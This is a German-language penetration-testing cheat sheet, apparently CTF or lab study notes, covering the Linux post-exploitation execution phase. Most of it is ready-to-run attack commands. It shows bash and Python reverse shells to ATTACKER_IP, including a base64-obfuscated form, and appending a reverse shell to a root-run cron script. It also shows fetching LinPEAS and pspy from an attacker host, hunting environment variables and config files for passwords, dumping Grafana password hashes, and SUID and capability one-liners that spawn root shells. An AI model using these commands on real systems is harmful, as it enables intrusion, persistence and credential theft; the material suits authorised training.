# Execution

## 1. Ziel der Execution Phase

- Code und Befehle auf dem kompromittierten System ausführen
- Zugriff festigen
- Weitere Informationen sammeln
- Privilege Escalation vorbereiten
---

## 2. Relevante Techniken & Vorgehensweisen

### Command Execution

- Shell-Befehle nach Initial Access
- Script-Ausführung (Bash, Python, PHP)
- Binary Execution
- Cron Jobs triggern

### Enumeration auf System

- User- und Gruppen-Information
- Sudo-Berechtigungen
- SUID/SGID Binaries
- Capabilities
- Writable Files/Directories
- Laufende Prozesse
- Cron Jobs
- Network Connections

### Tool Deployment

- Enumeration Scripts (LinPEAS, pspy)
- Exploit Binaries
- Reverse Shell Payloads

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- Bash als Standard-Shell
- Python oft verfügbar für Scripting
- `/tmp` Directory als Arbeitsverzeichnis (world-writable)
- Prozesse als spezifische User/Groups
- Sudo-System für Privilege Management
- SUID Bit für privilegierte Binary-Ausführung

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### Post-Exploitation Execution

- Shell-Befehle nach Reverse Shell
- Scripts via Cron Jobs
- SUID Binaries
- Sudo-Misconfiguration
- Writable Scripts die von Privileged Users ausgeführt werden
- Capabilities auf Binaries

---

## 5. Wichtige Befehle, Tools & Syntax

### Basic System Enumeration

**User Information**


```bash
whoami
id
groups
```

**System Information**


```bash
hostname
uname -a
cat /etc/os-release
```

**Current Directory**


```bash
pwd
```

**Process Listing**


```bash
ps aux
ps -ef
```

**Network Connections**


```bash
ss -tulpn
ss -tulpn | grep 127.0.0.1
netstat -tuln
```

**File Listing**


```bash
ls -la
ls -la /home
ls -la /root
```

### Sudo Enumeration


````bash
sudo -l
```

**Beispiel Output:**
```
User alice may run the following commands on user1-VirtualBox:
    (ALL) NOPASSWD: /usr/bin/apt, /usr/bin/zip, /usr/bin/base64
````

### SUID Binary Discovery


```bash
find / -perm -4000 -type f 2>/dev/null
find / -type f -perm -u+s -exec ls -l {} \; 2> /dev/null
```

### Capabilities Enumeration


````bash
getcap -r / 2>/dev/null
```

**Beispiel Output:**
```
/usr/bin/python3.8 = cap_setuid+ep
````

### Writable Files


```bash
find / -writable -type f 2>/dev/null
find / -type f -perm -o=w 2>/dev/null
find /etc -writable -ls 2>/dev/null
```

### Cron Jobs


```bash
crontab -l
ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab
```

### Process Monitoring

**pspy64 (ohne root)**


```bash
# Transfer nach /tmp
cd /tmp
wget http://ATTACKER_IP:8080/pspy64
chmod +x pspy64
./pspy64
```

### LinPEAS Execution


```bash
# Download
cd /tmp
wget http://ATTACKER_IP/linpeas.sh

# Executable machen
chmod +x linpeas.sh

# Ausführen
./linpeas.sh
```

**Alternative: Direct Execution**


```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

### File Transfer Methods

**Python HTTP Server (Kali)**


```bash
python3 -m http.server 8080
```

**Wget (Target)**


```bash
wget http://ATTACKER_IP:8080/file
```

**Curl (Target)**


```bash
curl http://ATTACKER_IP:8080/file -o file
```

**SCP**


```bash
scp file user@target:/path/to/destination
scp user@target:/path/to/file .
```

### Environment Variables Check


```bash
env
env | grep -i pass
printenv
```

### Config File Analysis


```bash
cat /var/www/html/config.php
cat /opt/tomcat/conf/tomcat-users.xml
cat /var/lib/grafana/grafana.db
```

### Database Access

**MySQL/MariaDB**


```bash
mysql -h 127.0.0.1 -u USER -p
```

**SQLite**


```bash
sqlite3 database.db
sqlite3 grafana.db "SELECT login, password, salt FROM user;"
```

### Script Modification

**Nano Editor**


```bash
nano script.sh
```

**Echo Append**


```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> script.sh
```

**Make Executable**


```bash
chmod +x script.sh
```

### Reverse Shell Payloads

**Bash**


```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Python**


```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Base64 Encoded**


```bash
# Encode
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64 -w0

# Execute
echo 'BASE64_STRING' | base64 -d | bash
```

### Shell Stabilization


```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Script Command
script -q /dev/null -c bash

# Full Stabilization
# In Reverse Shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z

# In Local Shell:
stty raw -echo; fg
# Enter drücken

# In Reverse Shell:
export TERM=xterm
export SHELL=/bin/bash
```

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard Post-Exploitation Workflow

1. **Shell Stabilisierung**
    - PTY spawnen
    - TERM Variable setzen
    - Shell interaktiv machen
2. **Basic Enumeration**


```bash
   whoami
   id
   hostname
   pwd
   ls -la
```

3. **User Context**


```bash
   sudo -l
   groups
   cat /etc/passwd | grep sh$
```

4. **System Information**


```bash
   uname -a
   cat /etc/os-release
```

5. **Quick Wins Checken**
    - SUID Binaries
    - Sudo Permissions
    - Writable Files in privileged locations
    - Environment Variables
6. **Tool Deployment**
    - LinPEAS für umfassende Enumeration
    - pspy für Process Monitoring
    - Exploit-Binaries falls nötig
7. **Detailed Analysis**
    - Config Files analysieren
    - Databases prüfen
    - Cron Jobs identifizieren
    - Network Services

### Wichtige Hinweise

**/tmp Directory als Arbeitsplatz**


````bash
cd /tmp
pwd
```
- World-writable
- Oft nicht noexec gemountet
- Ideal für Tool-Deployment

**SUID Binaries systematisch prüfen**
- Alle gefundenen Binaries gegen GTFOBins checken
- Nur ungewöhnliche Binaries sind interessant
- Standard-Binaries wie `/usr/bin/sudo` ignorieren

**LinPEAS Output Interpretation**
- Red/Yellow = High Priority
- Blue/Green = Informational
- Sections: Sudo, SUID, Capabilities, Cron, Network

**pspy Verwendung**
- Zeigt alle Prozesse (auch von root)
- Ideal für Cron Job Discovery
- UID 0 = root Prozesse
- Paths von Scripts notieren

**Process Monitoring für Cron Jobs**
- pspy laufen lassen (1-2 Minuten)
- Root-Prozesse identifizieren
- Script-Pfade notieren
- Write-Permissions auf Scripts prüfen

**Environment Variables**
- Immer nach Passwords suchen
- Container-Umgebungen besonders anfällig
- Format: `VARIABLE_NAME=value`

**Sudo -l Output verstehen**
```
(ALL) NOPASSWD: /usr/bin/apt
````

- `(ALL)` = Als alle User ausführbar
- `NOPASSWD` = Kein Passwort nötig
- Binary-Path muss exakt sein

**Capabilities vs SUID**

- Capabilities = Granulare Rechte (z.B. `cap_setuid`)
- SUID = Binary läuft als Owner
- Beide können zu root führen

### File Permission Interpretation


```bash
-rwsr-xr-x 1 root root ... binary
```

- `s` in Owner-Permissions = SUID Bit
- Owner = root → Binary läuft als root


````bash
drwxrwxrwx 2 root root ... directory
```
- `rwx` für alle = World-writable

---

## 7. Typische Findings & Fehler

### Häufige Findings

**Sudo Misconfiguration**
```
(ALL) NOPASSWD: /usr/bin/apt, /usr/bin/zip, /usr/bin/base64, /usr/bin/find
```

**SUID Binaries**
```
/usr/bin/find
/usr/bin/php7.3
/usr/bin/python3.8
/usr/local/bin/log_collector
```

**Capabilities**
```
/usr/bin/python3.8 = cap_setuid+ep
```

**Writable Cron Scripts**
```
-rwxr-xr-x 1 marcy marcy 79 Sep 23 17:58 backup.sh
# Script wird von root via Cron ausgeführt
```

**Environment Variables mit Credentials**
```
LIMESURVEY_PASS=5W5HN4K4GCXf9E
MYSQL_ROOT_PASSWORD=password123
```

**Password Reuse**
- Tomcat → SSH
- Database → System User
- FTP → SSH

**Interessante Prozesse (pspy)**
```
2024/10/03 12:00:01 CMD: UID=0 PID=12345 | /bin/bash /home/grimmie/backup.sh
````

### Typische Fehler

**Shell nicht stabilisiert**

- Ctrl+C killt Shell
- Keine Tab-Completion
- Pfeiltasten funktionieren nicht

**Zu schnell weitergegangen**

- Nicht alle SUID Binaries geprüft
- Sudo-Permissions nicht vollständig analysiert
- Environment Variables ignoriert

**Falsche Working Directory**


```bash
# Falsch: In Home-Directory mit read-only Permissions
cd /home/user

# Richtig: In /tmp
cd /tmp
```

**LinPEAS Output nicht systematisch durchgegangen**

- Nur erste Findings angeschaut
- Capabilities übersehen
- Cron Jobs nicht beachtet

**pspy zu kurz laufen gelassen**

- Cron Jobs laufen oft nur alle 1-5 Minuten
- Mindestens 2-3 Minuten monitoren

**SUID Exploitation Fehler**


```bash
# Falsch: Relativer Path
./find . -exec /bin/sh -p \; -quit

# Richtig: Absoluter Path oder Binary in PATH
find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Capabilities nicht mit -p Flag**


```bash
# Falsch: Verliert Privileges
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Richtig: Behält Privileges
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh -p")'
```

**File Permissions falsch gesetzt**


```bash
# SUID muss auf Binary gesetzt werden
chmod +x script.sh        # Falsch
chmod u+s script.sh       # Richtig für SUID
```

**Network Enumeration vergessen**


```bash
# Interne Services nicht identifiziert
ss -tulpn | grep 127.0.0.1
```

**Config Files nicht analysiert**

- `/var/www/html` Web-Configs
- `/opt/tomcat/conf` Tomcat-Configs
- `/etc` System-Configs
